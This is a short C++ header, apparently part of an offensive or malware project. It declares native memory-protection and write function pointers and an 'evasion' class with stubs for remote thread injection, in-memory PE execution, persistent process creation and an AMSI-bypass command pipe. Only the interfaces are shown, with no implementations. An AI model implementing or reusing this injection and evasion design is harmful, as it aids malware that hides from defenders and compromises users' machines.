#include <Windows.h>
#include <string>
#include <vector>
#include "core.h"



typedef NTSTATUS(NTAPI* NtProtectVirtualMemoryFunctionPointer)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    OUT PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

typedef NTSTATUS(NTAPI* NtWriteVirtualMemoryFunctionPointer)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

class evasion
{
private:
public:
    static void inject_remote_thread(int pid);

    static int run_portable_executable(void* image);

    static PROCESS_INFO* create_persistent_process();

    static void send_command(const char* cmd, HANDLE amsiBypassWrPipe);

};

